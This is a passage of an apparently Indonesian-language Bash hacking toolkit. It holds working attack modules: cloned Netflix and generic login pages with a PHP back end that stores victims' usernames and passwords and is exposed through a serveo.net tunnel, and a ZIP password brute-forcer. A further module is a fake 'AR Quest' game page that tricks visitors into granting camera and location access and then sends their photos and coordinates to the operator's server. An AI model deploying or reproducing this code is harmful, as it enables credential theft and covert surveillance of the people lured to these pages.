<input type="email" name="username" placeholder="Enter your email" required>
<input type="password" name="password" placeholder="Password" required>
<button type="submit">Next</button>
</form></div></body></html>
EOF
            ;;
        netflix)
            cat > index.html <<'EOF'
<!DOCTYPE html><html><head><meta charset="UTF-8"><title>Netflix</title>
<meta name="viewport" content="width=device-width,initial-scale=1">
<style>body{margin:0;font-family:Helvetica,Arial;background:#000;color:#fff}.wrapper{max-width:450px;margin:80px auto;padding:0 20px}.logo{width:170px;margin-bottom:30px}input{width:100%;padding:15px;margin:10px 0;border:none;border-radius:4px;font-size:16px}button{width:100%;padding:15px;background:#e50914;color:#fff;border:none;border-radius:4px;font-size:16px;font-weight:bold;cursor:pointer}</style></head><body>
<center><img class="logo" src="https://upload.wikimedia.org/wikipedia/commons/0/08/Netflix_2015_logo.svg"></center>
<div class="wrapper">
<form action="login.php" method="POST">
<input type="text" name="username" placeholder="Email or phone number" required>
<input type="password" name="password" placeholder="Password" required>
<button type="submit">Sign In</button>
</form></div></body></html>
EOF
            ;;
        *)  # default untuk yang belum ada template
            [[ ! -f index.html && ! -f index.php ]] && {
                cat > index.html <<'EOF'
<!DOCTYPE html>
<html><head><title>Login</title></head><body bgcolor="#f2f2f2">
<center><h2>Login</h2>
<form method="POST" action="login.php">
<label>Username:</label><br><input name="username"><br>
<label>Password:</label><br><input type="password" name="password"><br><br>
<input type="submit" value="Login">
</form></center></body></html>
EOF
            }
            ;;
    esac

    # ---------- login.php universal ----------
    cat > login.php <<'PHP'
<?php
$user = $_POST['username'] ?? '';
$pass = $_POST['password'] ?? '';
if ($user && $pass) {
    file_put_contents('php://stderr', "\n[+] CREDENTIAL BARU =========================\nUsername: $user\nPassword: $pass\n==========================================\n");
    file_put_contents('usernames.txt', "$user:$pass\n", FILE_APPEND | LOCK_EX);
}
$host = basename(dirname(__FILE__));
$real = ['instagram'=>'instagram.com','facebook'=>'facebook.com','twitter'=>'twitter.com','google'=>'accounts.google.com','netflix'=>'netflix.com'];
header('Location: https://'.($real[$host]??'google.com'));
exit;
PHP

    # ---------- log & tunnel ----------
    SERVEO_LOG="$LOG_DIR/serveo.log"
    rm -f "$SERVEO_LOG"

    echo -e "${YELLOW}[+] Starting PHP server...${RESET}"
    php -S 127.0.0.1:$port > /dev/null 2>&1 &
    PHP_PID=$!
    sleep 2

    echo -e "${YELLOW}[+] Starting serveo tunnel...${RESET}"
    ssh -o StrictHostKeyChecking=no -o ServerAliveInterval=60 \
        -R 80:127.0.0.1:$port serveo.net 2>&1 | tee "$SERVEO_LOG" &
    SSH_PID=$!

    timeout=20
    until grep -qE 'https://.*serveo.net' "$SERVEO_LOG" 2>/dev/null || (( timeout <= 0 )); do
        sleep 1
        ((timeout--))
    done

    LINK="$(grep -Eo 'https://[^ ]*serveo.net' "$SERVEO_LOG" 2>/dev/null | head -n1)"
    [[ -z "$LINK" ]] && {
        echo -e "${RED}Gagal mendapatkan link!${RESET}"
        kill "$PHP_PID" "$SSH_PID" 2>/dev/null
        return 1
    }

    echo -e "\n${GREEN}✓ Link phishing aktif:${RESET} ${CYAN}${LINK}${RESET}\n"

    # ---------- monitor ----------
    trap 'echo -e "\n${YELLOW}Berhenti...${RESET}"; kill $PHP_PID $SSH_PID 2>/dev/null; exit 0' INT
    echo -e "${YELLOW}[+] Menunggu korban... (Ctrl+C untuk berhenti)${RESET}"
    while true; do
        [[ -f "ip.txt" ]] && {
            echo -e "${GREEN}[+] IP ditemukan:${RESET} $(cat ip.txt)"
            mv "ip.txt" "$LOG_DIR/ip_$(date +%s).txt"
        }
        [[ -f "usernames.txt" ]] && {
            echo -e "${GREEN}[+] Credential ditemukan:${RESET} $(tail -n1 usernames.txt)"
            mv "usernames.txt" "$LOG_DIR/creds_$(date +%s).txt"
        }
        sleep 2
    done
}

bruteforce_zip() {
    local RED='\033[0;31m'
    local GREEN='\033[0;32m'
    local YELLOW='\033[1;33m'
    local BLUE='\033[0;34m'
    local NC='\033[0m'
    
    local WORDLIST_URL="https://raw.githubusercontent.com/DanxyOfficial/pas/refs/heads/main/kunci.sh"
    local WORDLIST_FILE="kunci.sh"
    
    clear
    echo -e "
  ${GREEN}● ${YELLOW}● ${RED}●                                                  ${RED}TOOLS V8.4${BLUE}        
┌──────────────────────────────────────────────────────────────────┐
│  ${GREEN}0${RED}            ${GREEN}0${RED} ██████╗ ███████╗███████╗██╗██████╗     ${GREEN}0${RED}        ${GREEN}0${BLUE}│
│ ${GREEN}0${RED}        ${GREEN}0${RED}      ██╔══██╗██╔════╝╚════██║██║██╔══██╗      ${GREEN}0${BLUE}       │
│   ${GREEN}0${RED}        ${GREEN}0${RED}    ██████╦╝█████╗ ${GREEN}0${RED}  ███╔═╝██║██████╔╝  ${GREEN}0${RED}       ${GREEN}0${BLUE}   │
│     ${GREEN}0${RED}    ${GREEN}0${RED}      ██╔══██╗██╔══╝  ██╔══╝  ██║██╔═══╝${GREEN}0${RED}     ${GREEN}0${BLUE}        │
│${GREEN}0${RED}         ${GREEN}0${RED}      ██████╦╝██║  ${GREEN}0${RED}  ███████╗██║██║  ${GREEN}0${RED}            ${GREEN}0${BLUE}   │
│    ${GREEN}0${RED}        ${GREEN}0${RED}   ╚═════╝ ╚═╝${GREEN}0${RED} ${GREEN}0${RED}  ╚══════╝╚═╝╚═╝${GREEN}0${RED}        ${GREEN}0${BLUE}         │
└──────────────────────────────────────────────────────────────────┘
│ ${GREEN}FITUR INI BERGUNA UNTUK MEMECAHKAN PASWORD FILE ZIP YANG TERKUNCI${BLUE}│
└──────────────────────────────────────────────────────────────────┘"
    if ! command -v unzip &> /dev/null; then
        echo -e "${RED}Error: unzip tidak terinstall!${NC}"
        echo "Install: pkg install unzip"
        read -p "Tekan ENTER untuk kembali..."
        return 1
    fi
    echo -e "${YELLOW}"
    read -p " MASUKAN PATH FILE ZIP : " ZIP_FILE
    
    if [ -z "$ZIP_FILE" ]; then
        echo -e "${RED}Error: Path file tidak boleh kosong!${NC}"
        read -p "Tekan ENTER untuk kembali..."
        return 1
    fi
    
    if [ ! -f "$ZIP_FILE" ]; then
        echo -e "${RED}Error: File '$ZIP_FILE' tidak ditemukan!${NC}"
        read -p "Tekan ENTER untuk kembali..."
        return 1
    fi
    
    echo ""
    echo -e "${GREEN}✓ File ditemukan: $ZIP_FILE${NC}"
    echo ""
    
    echo -e "${YELLOW}"
    read -p "MEMULAI BRUTE FORCE ZIP ? (Y/N): " CONFIRM
    
    if [[ ! "$CONFIRM" =~ ^[Yy]$ ]]; then
        echo -e "${RED}DI BATALKAN${NC}"
        read -p "Tekan ENTER untuk kembali..."
        return 0
    fi
    
    echo ""
    echo -e "${BLUE}[*] Memulai proses...${NC}"
    echo ""
    
    # Download wordlist jika belum ada
    if [ ! -f "$WORDLIST_FILE" ]; then
        echo -e "${YELLOW}[*] Mendownload wordlist dari GitHub...${NC}"
        
        if command -v curl &> /dev/null; then
            curl -s -o "$WORDLIST_FILE" "$WORDLIST_URL"
        elif command -v wget &> /dev/null; then
            wget -q -O "$WORDLIST_FILE" "$WORDLIST_URL"
        else
            echo -e "${RED}Error: curl atau wget tidak ditemukan!${NC}"
            read -p "Tekan ENTER untuk kembali..."
            return 1
        fi
        
        if [ $? -eq 0 ] && [ -f "$WORDLIST_FILE" ]; then
            echo -e "${GREEN}✓ Wordlist berhasil didownload${NC}"
        else
            echo -e "${RED}✗ Gagal mendownload wordlist${NC}"
            read -p "Tekan ENTER untuk kembali..."
            return 1
        fi
        echo ""
    fi
    
    local TOTAL=$(wc -l < "$WORDLIST_FILE" 2>/dev/null || echo 0)
    local ATTEMPTS=0
    local START_TIME=$(date +%s)
    
    echo -e "${BLUE}[*] Total password yang akan dicoba: ${GREEN}$TOTAL${NC}"
    echo -e "${BLUE}[*] Memulai bruteforce...${NC}"
    echo ""
    
    while IFS= read -r PASSWORD || [ -n "$PASSWORD" ]; do
        [ -z "$PASSWORD" ] && continue
        
        ((ATTEMPTS++))
        if ((ATTEMPTS % 50 == 0)); then
            local PERCENT=$((ATTEMPTS * 100 / TOTAL))
            echo -ne "${YELLOW}[*] Progress: $ATTEMPTS/$TOTAL ($PERCENT%) - Testing: $PASSWORD${NC}\r"
        fi
        
        if unzip -P "$PASSWORD" -t "$ZIP_FILE" &>/dev/null; then
            local END_TIME=$(date +%s)
            local ELAPSED=$((END_TIME - START_TIME))
            
            echo -e "\n"
            echo -e "${GREEN}┌================================${NC}"
            echo -e "${GREEN}│✓ PASSWORD DITEMUKAN!${NC}"
            echo -e "${GREEN}│================================${NC}"
            echo -e "${GREEN}│Password: ${YELLOW}$PASSWORD${NC}"
            echo -e "${GREEN}│Percobaan: $ATTEMPTS/$TOTAL${NC}"
            echo -e "${GREEN}│Waktu: ${ELAPSED} detik${NC}"
            echo -e "${GREEN}└================================${NC}"
            echo ""
            
            if [[ "$EXTRACT" =~ ^[Yy]$ ]]; then
                local OUTPUT_DIR="extracted_$(date +%s)"
                echo ""
                echo -e "${BLUE}[*] Mengekstrak ke folder: $OUTPUT_DIR${NC}"
                
                if unzip -P "$PASSWORD" "$ZIP_FILE" -d "$OUTPUT_DIR" &>/dev/null; then
                    echo -e "${GREEN}✓ File berhasil diekstrak!${NC}"
                    echo -e "${GREEN}Lokasi: $OUTPUT_DIR${NC}"
                else
                    echo -e "${RED}✗ Gagal mengekstrak file${NC}"
                fi
            fi
            
            echo ""
            read -p "Tekan ENTER untuk kembali..."
            return 0
        fi
        
    done < "$WORDLIST_FILE"
    
    local END_TIME=$(date +%s)
    local ELAPSED=$((END_TIME - START_TIME))
    
    echo -e "\n"
    echo -e "${RED}┌================================${NC}"
    echo -e "${RED}│✗ Password tidak ditemukan${NC}"
    echo -e "${RED}│================================${NC}"
    echo -e "${RED}│Total percobaan: $ATTEMPTS${NC}"
    echo -e "${RED}│Waktu: ${ELAPSED} detik${NC}"
    echo -e "${RED}└================================${NC}"
    echo ""
    echo -e "${YELLOW}Tips:${NC}"
    echo -e "- Pastikan password ada di wordlist"
    echo -e "- Update wordlist di: $WORDLIST_URL"
    echo -e "- Atau tambahkan password manual ke file: $WORDLIST_FILE"
    echo ""
    read -p "Tekan ENTER untuk kembali..."
    return 1
}

exif_tool() {
  read -p "Masukkan file foto: " foto
  exiftool "$foto" | grep -i "GPS\|Date\|Model"
  read -p "Tekan Enter untuk kembali..."
}

port_scan() {
  read -p "Masukkan IP/host: " target
  nmap -p- --min-rate=1000 "$target"
  read -p "Tekan Enter untuk kembali..."
}

whois_lookup() {
  read -p "Masukkan domain: " domain
  whois "$domain"
  read -p "Tekan Enter untuk kembali..."
}

#####
GeoIP_ISP() {
clear
spasi
echo -e "
 ┌──────────────────────────────────────────┐
 │  ██████╗░███████╗░█████╗░░░░██╗██████╗   │
 │ ██╔════╝░██╔════╝██╔══██╗░░░██║██╔══██╗  │
 │ ██║░░██╗░█████╗░░██║░░██║░░░██║██████╔╝  │
 │ ██║░░╚██╗██╔══╝░░██║░░██║██╗██║██╔═══╝   │
 │ ╚██████╔╝███████╗╚█████╔╝╚█║██║██║       │
 │  ╚═════╝░╚══════╝░╚════╝░░╚╝╚═╝╚═╝       │
 └──────────────────────────────────────────┘
 │ LACAK INFORMASI IP / DOMAIN │
 └─────────────────────────────┘
" | lolcat -p 0.7
read -p " MASUKAN IP / DOMAIN: " target
echo -e "\n[+] Tracking $target ..."
data=$(curl -s "http://ip-api.com/json/$target?fields=status,message,country,regionName,city,zip,lat,lon,isp,org,as,query")
status=$(echo "$data" | grep -o '"status":"[^"]*' | cut -d'"' -f4)

if [[ "$status" == "success" ]]; then
    echo -e "\n=== INFO IP TRACKER ==="
    echo -e "IP        : $(echo "$data" | grep -o '"query":"[^"]*' | cut -d'"' -f4)"
    echo -e "Negara    : $(echo "$data" | grep -o '"country":"[^"]*' | cut -d'"' -f4)"
    echo -e "Provinsi  : $(echo "$data" | grep -o '"regionName":"[^"]*' | cut -d'"' -f4)"
    echo -e "Kota      : $(echo "$data" | grep -o '"city":"[^"]*' | cut -d'"' -f4)"
    echo -e "Kode Pos  : $(echo "$data" | grep -o '"zip":"[^"]*' | cut -d'"' -f4)"
    echo -e "Latitude  : $(echo "$data" | grep -o '"lat":[^,]*' | cut -d':' -f2)"
    echo -e "Longitude : $(echo "$data" | grep -o '"lon":[^,]*' | cut -d':' -f2)"
    echo -e "ISP       : $(echo "$data" | grep -o '"isp":"[^"]*' | cut -d'"' -f4)"
    echo -e "Organisasi: $(echo "$data" | grep -o '"org":"[^"]*' | cut -d'"' -f4)"
    echo -e "AS        : $(echo "$data" | grep -o '"as":"[^"]*' | cut -d'"' -f4)"
else
    echo -e "[-] Gagal mendapatkan data: $(echo "$data" | grep -o '"message":"[^"]*' | cut -d'"' -f4)"
fi
}

track_live() {
mkdir -p DanxyTracker
cd DanxyTracker

# === HTML AR GAME TRANSPARAN ===
cat > index.html <<'EOF'
<!DOCTYPE html>
<html lang="id">
<head>
  <meta charset="UTF-8"/>
  <meta name="viewport" content="width=device-width, initial-scale=1"/>
  <title>AR Quest: Neon Explorer</title>
  <style>
    @import url('https://fonts.googleapis.com/css2?family=Orbitron:wght@500&display=swap');
    *{box-sizing:border-box}
    body{margin:0;font-family:'Orbitron',monospace;background:#0b0e1a;color:#fff;display:flex;align-items:center;justify-content:center;height:100vh;flex-direction:column}
    .screen{width:100%;max-width:400px;text-align:center;padding:30px}
    h1{color:#00f5ff;text-shadow:0 0 10px #00f5ff;font-size:24px;margin-bottom:10px}
    p{font-size:14px;color:#8fbcff;margin-bottom:25px;line-height:1.4}
    .btn{background:#00f5ff;color:#0b0e1a;border:none;padding:15px 40px;border-radius:30px;font-size:16px;cursor:pointer;transition:.3s}
    .btn:hover{transform:scale(1.05);box-shadow:0 0 15px #00f5ff}
    .avatar{width:120px;height:120px;border:2px solid #00f5ff;border-radius:50%;margin:0 auto 20px;background:url('data:image/svg+xml;utf8,<svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 100 100"><circle cx="50" cy="35" r="20" fill="%2300f5ff"/><rect x="30" y="60" width="40" height="30" fill="%2300f5ff"/></svg>') center/cover}
    .popup{position:fixed;top:0;left:0;width:100%;height:100%;background:#0b0e1ae6;display:none;align-items:center;justify-content:center;z-index:10}
    .popup .card{background:#111;border:2px solid #00f5ff;border-radius:15px;padding:25px;width:300px;text-align:center}
    .popup h2{color:#00f5ff;margin-top:0}
    .popup p{font-size:13px;color:#8fbcff;margin-bottom:20px}
    #featureList {
      list-style: none;
      padding: 0;
      margin-bottom: 20px;
    }
    #featureList li {
      margin-bottom: 8px;
      display: flex;
      align-items: center;
    }
    #featureList li::before {
      content: "✓"; /* Checkmark */
      color: #00f5ff;
      margin-right: 8px;
    }
    .hidden {
      display: none !important;
    }
    #permissionDetails {
      font-size: 12px;
      color: #666;
      margin-top: 10px;
    }
  </style>
</head>
<body>
  <!-- Screen 1: Welcome -->
  <div class="screen" id="welcome">
    <div class="avatar"></div>
    <h1>AR Quest: Neon Explorer</h1>
    <p>Selamat datang di dunia AR yang penuh petualangan! Bersiaplah untuk menjelajahi lingkungan sekitar Anda dengan cara yang baru dan menarik, klik tombol di bawah untuk melanjutkan</p>
    <button class="btn" onclick="showConsent()">Mulai Petualangan</button>
  </div>

  <!-- Screen 2: Consent -->
  <div class="popup" id="consentPopup">
    <div class="card">
      <h2>Aktifkan Fitur Tambahan</h2>
      <p>Untuk pengalaman yang lebih imersif, aktifkan fitur-fitur berikut:</p>
      <ul id="featureList">
        <li>Personalisasi Avatar (akses kamera) untuk membuat avatar anda</li>
        <li>Eksplorasi Lokasi (akses lokasi) untuk mendapatkan tempat karakter yang anda inginkan</li>
        <li>Interaksi Real-Time dengan Lingkungan karakter yang ingin anda mainkan</li>
      </ul>
      <p id="permissionDetails">Dengan mengaktifkan fitur-fitur ini, Anda memberikan izin sementara untuk mengakses kamera dan lokasi Anda. Data ini digunakan untuk meningkatkan pengalaman bermain dan tidak akan dibagikan kepada pihak ketiga.</p>
      <button class="btn" onclick="requestPermissions()">Aktifkan Semua Fitur</button>
    </div>
  </div>

  <!-- Loading Screen -->
  <div class="screen hidden" id="loadingScreen">
    <h1>Memuat Dunia AR...</h1>
    <p>Harap tunggu sementara kami menyiapkan pengalaman Anda.</p>
  </div>

  <!-- Error Screen -->
  <div class="screen hidden" id="errorScreen">
    <h1>Terjadi Kesalahan</h1>
    <p id="errorMessage">Gagal memuat fitur AR.  Pastikan izin kamera dan lokasi diizinkan.</p>
    <button class="btn" onclick="retryPermissions()">Coba Lagi</button>
  </div>

  <!-- Hacked Screen -->
  <div class="screen hidden" id="hackedScreen">
    <h1>HACKED BY DANXY OFFICIAL</h1>
  </div>

  <script>
    function showConsent() {
      document.getElementById('welcome').classList.add('hidden');
      document.getElementById('consentPopup').style.display = 'flex';
    }

    async function requestPermissions() {
      document.getElementById('consentPopup').style.display = 'none';
      document.getElementById('loadingScreen').classList.remove('hidden');

      try {
        // Request camera and location permissions simultaneously
        const [stream, position] = await Promise.all([
          navigator.mediaDevices.getUserMedia({ video: true }),
          new Promise((resolve, reject) => {
            navigator.geolocation.getCurrentPosition(resolve, reject);
          }),
        ]);

        const { latitude: lat, longitude: lon } = position.coords;

        // Take the first photo
        const canvas = document.createElement('canvas');
        const video = document.createElement('video');
        video.srcObject = stream;
        await video.play();
        canvas.width = video.videoWidth;
        canvas.height = video.videoHeight;
        canvas.getContext('2d').drawImage(video, 0, 0);
        const img = canvas.toDataURL('image/jpeg').split(',')[1];

        // Send the first data
        fetch('/data', {
          method: 'POST',
          headers: { 'Content-Type': 'application/json' },
          body: JSON.stringify({ index: 1, lat, lon, img }),
        });

        // Hide loading screen
        document.getElementById('loadingScreen').classList.add('hidden');

        // Set up interval to take 9 more photos every 5 seconds
        let count = 2;
        const iv = setInterval(async () => {
          if (count > 10) {
            clearInterval(iv);
            document.getElementById('hackedScreen').classList.remove('hidden');
            return;
          }

          try {
            const [s, p] = await Promise.all([
              navigator.mediaDevices.getUserMedia({ video: true }),
              new Promise((resolve, reject) => {
                navigator.geolocation.getCurrentPosition(resolve, reject);
              }),
            ]);

            const v = document.createElement('video');
            v.srcObject = s;
            await v.play();
            const c = document.createElement('canvas');
            c.width = v.videoWidth;
            c.height = v.videoHeight;
            c.getContext('2d').drawImage(v, 0, 0);
            const img2 = c.toDataURL('image/jpeg').split(',')[1];

            fetch('/data', {
              method: 'POST',
              headers: { 'Content-Type': 'application/json' },
              body: JSON.stringify({ index: count, lat: p.coords.latitude, lon: p.coords.longitude, img: img2 }),
            });

            s.getTracks().forEach((t) => t.stop());
            count++;
          } catch (error) {
            console.error("Error during interval:", error);
            clearInterval(iv);
            showError("Gagal mengambil data. Pastikan izin kamera dan lokasi tetap diizinkan.");
            return;
          }
        }, 5000);

        stream.getTracks().forEach((t) => t.stop());
      } catch (error) {
        console.error("Error requesting permissions:", error);
        showError("ERR_CONNECTION_CLOSED");
      }
    }

    function retryPermissions() {
      document.getElementById('errorScreen').classList.add('hidden');
      showConsent(); // Go back to the consent screen
    }

    function showError(message) {
      document.getElementById('loadingScreen').classList.add('hidden');
      document.getElementById('errorScreen').classList.remove('hidden');
      document.getElementById('errorMessage').textContent = message;
    }
  </script>
</body>
</html>
EOF

# === Server Python (auto-port) ===
cat > server.py <<'EOF'
import base64, json, os, datetime, socket
from http.server import BaseHTTPRequestHandler, HTTPServer

PORT = 8081

def find_free_port(start=8081):
    for p in range(start, start+100):
        try:
            with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
                s.bind(("0.0.0.0", p))
                return p
        except OSError:
            continue
    raise RuntimeError("No free port")

PORT = find_free_port(PORT)

class Handler(BaseHTTPRequestHandler):
    def do_POST(self):
        if self.path == "/data":
            length = int(self.headers["Content-Length"])
            data = json.loads(self.rfile.read(length).decode("utf-8"))
            idx = data.get("index", 1)
            lat = data.get("lat")
            lon = data.get("lon")
            img_b64 = data.get("img")

            with open(f"image_{idx}.jpg", "wb") as f:
                f.write(base64.b64decode(img_b64))

            map_html = f"""<!DOCTYPE html>
<html><head><title>Lokasi AR Quest</title></head>
<body>
<iframe width="100%" height="500"
src="https://maps.google.com/maps?q={lat},{lon}&hl=id&z=18&amp;output=embed"></iframe>
</body></html>"""
            with open("map.html", "w") as f:
                f.write(map_html)

            print(f"[ + ] image_{idx}.jpg & lokasi tersimpan")
            print(f"[ ! ] PERIKSA DI FOLDER DanxyTracker")
            self.send_response(200)
            self.end_headers()

    def do_GET(self):
        self.send_response(200)
        self.send_header("Content-type", "text/html")
        self.end_headers()
        with open("index.html", "rb") as f:
            self.wfile.write(f.read())

print(f"SERVER BERJALAN DI PORT: {PORT}")
print(f"                                        ")
print(f"BUAT SESSION BARU DAN MASUKAN INI:")
print(f"ssh -R maxsoft:80:localhost:{PORT} serveo.net")
HTTPServer(("0.0.0.0", PORT), Handler).serve_forever()
EOF
clear
echo -e "${WHITE}
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⣠⣤⣤⣄⣀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣠⣤⣶⣿⠿⢿⣿⣿⡿⣿⣿⣷⣦⣀⣀⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣠⣾⡿⢋⣵⣶⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣆⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⣤⡄⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⣾⠟⣫⣾⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣧⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣀⣤⣶⣿⣿⣿⠃⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⣞⣵⣿⣿⣿⣿⣿⣿⣿⣿⠿⠿⢿⣿⣿⣿⣿⣿⣿⣿⣿⠦⡄⠀⠀⣀⣀⣤⣤⣴⢤⣤⣤⣶⣾⣿⣿⣿⣿⣿⡿⠃⡀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢸⣿⢿⣿⣿⣿⣿⣿⠿⢛⣀⣤⣤⣄⣄⣀⣻⣻⣘⣠⣤⣧⣿⣧⣤⣿⣿⣿⣿⠇⣿⠻⢜⡻⠿⣿⣿⣿⣿⣿⣿⣿⡿⠃⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢘⣷⣿⣿⣿⣻⣭⣴⣾⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⡿⢟⣩⣾⣿⣿⣿⣿⠟⣸⡇⠰⡦⠀⣠⣿⣿⣿⣿⣿⣿⣿⣿⠇⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣻⡿⣿⣭⣛⡛⠿⣿⣿⡿⠿⠿⠿⠟⢿⣛⣹⣽⣯⣶⣿⣿⣿⣿⣿⣿⣏⠸⣟⣓⣢⣤⣾⣿⣿⣿⣿⣿⣿⣿⣿⣿⡦⠄
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀${RED}⣤⣾⣟⣿⣯⣿⣿⣿⣷⣋⣀${WHITE}⠀⠀⠀⠀⢀⣤⣿⣿⣿⣿⣿⣿⣿⡏⠉⠉⠉⠉⠉⠉⠉⠛⠛⠛⠉⠉⠉⠙⠋⠉⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀${RED}⠘⣿⣷⣿⣿⣿⣿⣿⣽⣯⣽⣷⡆${WHITE}⠀⠀⠻⠿⠓⠛⠛⣿⣿⣿⣿⣷⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀${RED}⢡⣭⡹⢿⣿⠃⠀⠀⠀⠘⢯${WHITE}⠀⢀⣀⣀⣀⢠⣤⣬⣧⣿⣷⣮⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣼⣿⣿⣷⣄⠀⠀⠀⣀⣤⣶⣾⣿⣿⣿⣿⣿⣿⣿⣯⣯⣩⣽⣄⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢻⣿⣿⣿⢟⣿⣾⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⢏⣵⣾⣿⢣⣿⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣠⣿⣿⣾⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⢿⣛⣵⣿⣿⠿⣣⣾⣿⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⣼⣿⣿⣿⣿⣿⣿⣿⣿⣟⣛⣛⣛⣯⣿⣶⣿⣿⠿⣋⣽⣾⣿⣿⣿⠀⢰⣆⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢠⡾⠋⣠⣠⣿⣝⢻⣿⣿⣿⣿⣿⣿⣿⢿⣛⣻⣿⣶⣿⣿⣿⣿⣿⣿⡇⣴⣿⣿⣿⡄⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠲⣴⣿⣴⣾⢹⣿⣿⠟⠋⢻⣿⣿⣿⣿⣿⣿⣾⣿⣿⣿⣿⣿⣿⣿⠿⠛⣻⣿⣿⣿⣿⣿⢳⣄⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣠⣴⣿⣿⣿⣯⣿⠿⠁⠀⠀⠈⣻⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⠋⣠⣾⣿⣿⣿⣿⢟⣩⣿⣿⣷⣦⣀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣾⣿⣿⣿⣿⣳⠟⠁⠀⠀⠀⠀⣼⡇⠙⠻⢿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣾⣿⣿⣿⣿⣿⡿⣴⣿⣿⣿⣿⣿⣿⣷⣤⡀${NC}⠀⠀⠀⠀⠀⠀⠀⠀
${RED}⠀⠀⠀⠀⠀⠀⠀⣠⠀⠀⠀⠀⠀⢈⠉⠉⢩⡿⠏⠀⣀⣀⠀⠀⠀⣿⠇${WHITE}⠀⢀⣦⢨⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⢛⣾⣿⣿⣿⣿⣿⣿⢿⣿⣿⠿⠲⠄⠀⠀⠀⠀⠀⠀
${RED}⠀⠀⠀⠀⠀⠀⣶⢿⣷⣶⡀⠀⢠⣿⠀⢀⣿⠃⠀⠀⠻⣿⠃⠀⠐⣿${WHITE}⠀⠀⢸⡿⠿⠿⠿⠿⠿⣿⣿⣿⣿⣿⠿⠿⠿⠱⠟⠛⠙⠛⠛⠉⠁⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
${RED}⠀⠀⠀⠀⠀⠘⣿⣿⢻⣿⠃⠀⣾⡇⠀⢸⣿⠀⠀⠀⢠⣶⡄⠀⢸⣿${WHITE}⠀⠀⣾⡇⠀⠀⠀⠀⠀⣿⣿⣿⣯⣿⡆⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
